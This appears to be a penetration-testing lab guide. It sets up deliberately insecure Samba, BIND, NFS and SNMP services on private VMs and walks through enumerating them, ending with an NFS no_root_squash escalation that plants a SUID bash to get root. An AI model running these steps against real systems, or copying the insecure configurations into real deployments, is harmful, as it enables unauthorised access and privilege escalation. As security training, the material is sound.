# Lab: Service Enumeration Deep Dive

## Objective

Set up real services on your VMs and practice the full enumeration workflow for each one. Most OSCP footholds come from thorough enumeration — not from running exploits blindly.

---

## Part 1: SMB Enumeration Lab

### Setup on Debian (192.168.244.132)

```bash
sudo apt install samba -y

# Create SMB users
sudo useradd -m -s /bin/bash smbuser
echo "smbuser:Welcome1!" | sudo chpasswd
sudo smbpasswd -a smbuser
# Enter: Welcome1!

# Create shares with different access levels
sudo mkdir -p /srv/samba/{public,internal,it_admin,backups}

echo "Company newsletter - Q3 2026" | sudo tee /srv/samba/public/newsletter.txt
echo "WiFi password: CorpWifi2026!" | sudo tee /srv/samba/internal/wifi_setup.txt
echo "VPN credentials: vpnadmin / VpnStr0ng!" | sudo tee /srv/samba/internal/vpn_info.txt
echo "Server list:" | sudo tee /srv/samba/it_admin/servers.txt
echo "  DB server: 192.168.244.130 (dbroot / Db@dmin!)" | sudo tee -a /srv/samba/it_admin/servers.txt
echo "Backup encryption key: bkup_K3y_2026!" | sudo tee /srv/samba/backups/encryption_key.txt

sudo chmod -R 777 /srv/samba/public
sudo chmod -R 770 /srv/samba/internal
sudo chmod -R 700 /srv/samba/it_admin
sudo chmod -R 770 /srv/samba/backups

# Configure Samba
cat << 'EOF' | sudo tee /etc/samba/smb.conf
[global]
   workgroup = WORKGROUP
   security = user
   map to guest = Bad User

[Public]
   path = /srv/samba/public
   browseable = yes
   read only = yes
   guest ok = yes

[Internal]
   path = /srv/samba/internal
   browseable = yes
   read only = yes
   valid users = smbuser
   guest ok = no

[IT-Admin]
   path = /srv/samba/it_admin
   browseable = no
   read only = yes
   valid users = smbuser
   guest ok = no

[Backups]
   path = /srv/samba/backups
   browseable = yes
   read only = no
   valid users = smbuser
   guest ok = no
EOF

sudo systemctl restart smbd nmbd
```

### Practice enumeration from Kali

```bash
# Step 1: nmap discovers SMB
nmap -sV -p 139,445 192.168.244.132

# Step 2: enum4linux — the all-in-one tool
enum4linux -a 192.168.244.132
# Look for: OS info, users, shares, password policy, groups

# Step 3: List shares without credentials (null session)
smbclient -L //192.168.244.132 -N
# Shows Public, Internal, Backups (IT-Admin is hidden — browseable=no)

# Step 4: Access the Public share (guest access)
smbclient //192.168.244.132/Public -N
smb: \> ls
smb: \> get newsletter.txt
smb: \> exit
cat newsletter.txt

# Step 5: Try null session on other shares
smbclient //192.168.244.132/Internal -N
# Access denied — needs credentials

# Step 6: CrackMapExec — check what's accessible
crackmapexec smb 192.168.244.132 -u '' -p '' --shares
# Shows Public is accessible, others aren't

# Step 7: After finding credentials (smbuser:Welcome1!)
crackmapexec smb 192.168.244.132 -u smbuser -p 'Welcome1!' --shares
# Shows READ access to Internal, IT-Admin, and READ/WRITE to Backups

# Step 8: Access Internal share
smbclient //192.168.244.132/Internal -U smbuser
# Password: Welcome1!
smb: \> ls
smb: \> get wifi_setup.txt
smb: \> get vpn_info.txt
smb: \> exit

# Step 9: Access the HIDDEN share (IT-Admin — not in the listing)
smbclient //192.168.244.132/IT-Admin -U smbuser
smb: \> ls
smb: \> get servers.txt
smb: \> exit

# Step 10: Read what you found
cat wifi_setup.txt     # WiFi password
cat vpn_info.txt       # VPN credentials!
cat servers.txt        # Database server credentials!

# Step 11: smbmap — shows permissions clearly
smbmap -H 192.168.244.132 -u smbuser -p 'Welcome1!'
# Shows READ/WRITE on each share

# Step 12: Recursive listing (see everything without connecting)
smbmap -H 192.168.244.132 -u smbuser -p 'Welcome1!' -R

# Step 13: nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.244.132
nmap --script smb-vuln* -p 445 192.168.244.132
```

**What you learned:** Hidden shares exist even when they don't appear in listings. Always try common share names (`IT`, `Admin`, `IT-Admin`, `HR`, `Finance`, `Backup`, `Backups`, `Dev`, `Staging`). Credentials found on one share often unlock others.

### Cleanup

```bash
sudo systemctl stop smbd nmbd
sudo userdel -r smbuser
sudo rm -rf /srv/samba
```

---

## Part 2: DNS Enumeration Lab

### Setup on Debian

```bash
sudo apt install bind9 bind9-utils -y

# Configure as authoritative DNS for lab.local
cat << 'EOF' | sudo tee /etc/bind/named.conf.local
zone "lab.local" {
    type master;
    file "/etc/bind/db.lab.local";
    allow-transfer { any; };
};

zone "244.168.192.in-addr.arpa" {
    type master;
    file "/etc/bind/db.192.168.244";
    allow-transfer { any; };
};
EOF

# Create the forward zone file
cat << 'EOF' | sudo tee /etc/bind/db.lab.local
$TTL    604800
@       IN      SOA     ns.lab.local. admin.lab.local. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      ns.lab.local.
ns      IN      A       192.168.244.132
@       IN      A       192.168.244.132
www     IN      A       192.168.244.132
mail    IN      A       192.168.244.132
ftp     IN      A       192.168.244.132
dev     IN      A       192.168.244.132
staging IN      A       192.168.244.132
admin   IN      A       192.168.244.132
vpn     IN      A       192.168.244.131
db      IN      A       192.168.244.130
internal IN     A       172.16.0.2
secret  IN      A       192.168.244.132
api     IN      A       192.168.244.132
git     IN      A       192.168.244.132
jenkins IN      A       192.168.244.131
nagios  IN      A       192.168.244.130
@       IN      MX  10  mail.lab.local.
@       IN      TXT     "v=spf1 mx -all"
_flag   IN      TXT     "FLAG{dns_zone_transfer_success}"
EOF

# Create the reverse zone file
cat << 'EOF' | sudo tee /etc/bind/db.192.168.244
$TTL    604800
@       IN      SOA     ns.lab.local. admin.lab.local. (
                              1         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      ns.lab.local.
132     IN      PTR     ns.lab.local.
131     IN      PTR     vpn.lab.local.
130     IN      PTR     db.lab.local.
EOF

sudo systemctl restart bind9
```

### Practice enumeration from Kali

```bash
# Step 1: nmap finds DNS
nmap -sV -p 53 192.168.244.132

# Step 2: Basic lookups
dig @192.168.244.132 lab.local
dig @192.168.244.132 lab.local ANY

# Step 3: ZONE TRANSFER (the big one)
dig axfr lab.local @192.168.244.132
# This dumps EVERY record in the domain
# You see: www, mail, ftp, dev, staging, admin, vpn, db, internal, secret, api, git, jenkins, nagios
# Plus the flag in the TXT record

# Step 4: Reverse lookups
dig -x 192.168.244.132 @192.168.244.132
dig -x 192.168.244.131 @192.168.244.132
dig -x 192.168.244.130 @192.168.244.132

# Step 5: Specific record types
dig @192.168.244.132 lab.local MX      # mail server
dig @192.168.244.132 lab.local TXT     # SPF, verification strings, flags
dig @192.168.244.132 lab.local NS      # name servers

# Step 6: Look up specific subdomains discovered from the zone transfer
dig @192.168.244.132 internal.lab.local
# Returns 172.16.0.2 — reveals the internal network!

dig @192.168.244.132 vpn.lab.local
# Returns 192.168.244.131 — VPN server is CentOS

# Step 7: nmap DNS scripts
nmap --script dns-zone-transfer -p 53 192.168.244.132 --script-args dns-zone-transfer.domain=lab.local
nmap --script dns-brute --script-args dns-brute.domain=lab.local 192.168.244.132

# Step 8: Subdomain brute force (if zone transfer is blocked)
gobuster dns -d lab.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 192.168.244.132:53
```

**What you learned:** Zone transfer dumps the entire DNS database — every hostname and IP. This reveals internal servers, hidden services, and network topology. Always try it. The discovered hostnames should be added to `/etc/hosts` and each one checked for web services.

### Cleanup

```bash
sudo systemctl stop bind9
sudo rm /etc/bind/db.lab.local /etc/bind/db.192.168.244
```

---

## Part 3: NFS Enumeration Lab

### Setup on Ubuntu (192.168.244.130)

```bash
sudo apt install nfs-kernel-server -y

# Create exports
sudo mkdir -p /srv/nfs/{public,configs,backups}
echo "Company public documents" | sudo tee /srv/nfs/public/readme.txt
echo "DB_HOST=localhost" | sudo tee /srv/nfs/configs/database.conf
echo "DB_PASS=NfsL3aked!" | sudo tee -a /srv/nfs/configs/database.conf
echo "Backup data here" | sudo tee /srv/nfs/backups/info.txt

# Configure exports — intentionally insecure
# no_root_squash = root on client = root on server (DANGEROUS)
cat << 'EOF' | sudo tee /etc/exports
/srv/nfs/public    *(ro,sync,no_subtree_check)
/srv/nfs/configs   *(ro,sync,no_subtree_check)
/srv/nfs/backups   *(rw,sync,no_root_squash,no_subtree_check)
EOF

sudo exportfs -ra
sudo systemctl restart nfs-kernel-server

# Make sure firewall allows NFS
sudo iptables -I INPUT 4 -p tcp --dport 2049 -j ACCEPT
sudo iptables -I INPUT 4 -p udp --dport 2049 -j ACCEPT
```

### Practice enumeration from Kali

```bash
# Step 1: nmap finds NFS
nmap -sV -p 111,2049 192.168.244.130

# Step 2: Show available exports
showmount -e 192.168.244.130
# /srv/nfs/public    *
# /srv/nfs/configs   *
# /srv/nfs/backups   *

# Step 3: Mount the public share
sudo mkdir -p /mnt/nfs_public
sudo mount -t nfs 192.168.244.130:/srv/nfs/public /mnt/nfs_public
ls /mnt/nfs_public
cat /mnt/nfs_public/readme.txt

# Step 4: Mount configs — find credentials!
sudo mkdir -p /mnt/nfs_configs
sudo mount -t nfs 192.168.244.130:/srv/nfs/configs /mnt/nfs_configs
cat /mnt/nfs_configs/database.conf
# DB_PASS=NfsL3aked!

# Step 5: Mount backups (read-write + no_root_squash)
sudo mkdir -p /mnt/nfs_backups
sudo mount -t nfs 192.168.244.130:/srv/nfs/backups /mnt/nfs_backups

# Step 6: EXPLOIT no_root_squash
# Create a SUID bash on the NFS share (as root on Kali)
sudo cp /bin/bash /mnt/nfs_backups/rootbash
sudo chmod +s /mnt/nfs_backups/rootbash
ls -la /mnt/nfs_backups/rootbash
# -rwsr-sr-x = SUID and SGID bits set

# Step 7: On Ubuntu, execute the SUID bash
# (SSH to Ubuntu or get a shell through another method)
/srv/nfs/backups/rootbash -p
whoami
# root!

# Step 8: nmap NFS scripts
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 192.168.244.130

# Cleanup mounts
sudo umount /mnt/nfs_public /mnt/nfs_configs /mnt/nfs_backups
```

**What you learned:** NFS with `no_root_squash` is a direct privilege escalation path. You can create SUID binaries on the share from your machine, then execute them on the target as root.

### Cleanup

```bash
# On Ubuntu
sudo exportfs -ua
sudo systemctl stop nfs-kernel-server
sudo rm -rf /srv/nfs
sudo sed -i '/srv\/nfs/d' /etc/exports
```

---

## Part 4: SNMP Enumeration Lab

### Setup on CentOS (192.168.244.131)

```bash
sudo dnf install net-snmp net-snmp-utils -y

# Configure SNMP with a community string
sudo cp /etc/snmp/snmpd.conf /etc/snmp/snmpd.conf.bak

cat << 'EOF' | sudo tee /etc/snmp/snmpd.conf
# Community strings (passwords for SNMP)
rocommunity public
rwcommunity private

# System info
syslocation "Server Room B, Rack 4"
syscontact "admin@company.com"
sysname "centos-app-server"

# Expose everything
view all included .1
access notConfigGroup "" any noauth exact all none none
EOF

sudo systemctl enable --now snmpd

# Allow SNMP through firewall
sudo iptables -I INPUT 4 -p udp --dport 161 -j ACCEPT
```

### Practice enumeration from Kali

```bash
# Step 1: nmap finds SNMP (UDP scan required)
sudo nmap -sU -p 161 192.168.244.131
# 161/udp open snmp

# Step 2: Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.244.131
# [192.168.244.131] Linux centos-app-server ... : public
# Found community string: "public"

# Step 3: Full SNMP walk (dumps everything)
snmpwalk -v2c -c public 192.168.244.131 | head -50
# Massive output — system info, interfaces, processes, software, users

# Step 4: Get specific useful information

# System description
snmpwalk -v2c -c public 192.168.244.131 1.3.6.1.2.1.1.1.0
# Shows: Linux centos-app-server 5.14.0... x86_64

# Hostname
snmpwalk -v2c -c public 192.168.244.131 1.3.6.1.2.1.1.5.0

# Network interfaces
snmpwalk -v2c -c public 192.168.244.131 1.3.6.1.2.1.2.2.1.2
# Shows all interface names (ens33, ens224, lo)
# ens224 reveals the second network interface!

# IP addresses on interfaces
snmpwalk -v2c -c public 192.168.244.131 1.3.6.1.2.1.4.20.1.1
# Shows: 192.168.244.131 AND 172.16.0.1
# Reveals the internal network!

# Running processes
snmpwalk -v2c -c public 192.168.244.131 1.3.6.1.2.1.25.4.2.1.2
# Shows every running process — might reveal hidden services

# Installed software
snmpwalk -v2c -c public 192.168.244.131 1.3.6.1.2.1.25.6.3.1.2

# TCP connections
snmpwalk -v2c -c public 192.168.244.131 1.3.6.1.2.1.6.13.1.3

# Step 5: User-friendly output with snmp-check
snmp-check 192.168.244.131 -c public

# Step 6: Check for write access (community string "private")
snmpwalk -v2c -c private 192.168.244.131 1.3.6.1.2.1.1.5.0
# If this works, you have READ-WRITE access
# You can potentially modify system configuration through SNMP
```

**What you learned:** SNMP with default community strings exposes everything — running processes (reveals hidden services), network interfaces (reveals hidden networks), installed software (reveals patch levels), and user accounts. This single service can map out an entire network.

### Cleanup

```bash
sudo systemctl stop snmpd
sudo mv /etc/snmp/snmpd.conf.bak /etc/snmp/snmpd.conf
```

---

## Enumeration Methodology Summary

```
FOR EVERY SERVICE YOU FIND:

1. Banner grab:     nc -vn TARGET PORT
2. Version check:   nmap -sV -p PORT TARGET
3. Searchsploit:    searchsploit SERVICE VERSION
4. Default creds:   Try admin:admin, anonymous, blank passwords
5. Service tools:   Run the service-specific enumeration tool
6. nmap scripts:    nmap --script SERVICE-* -p PORT TARGET
7. Document:        Write down every finding

The answers are in the enumeration. When stuck → enumerate more.
```
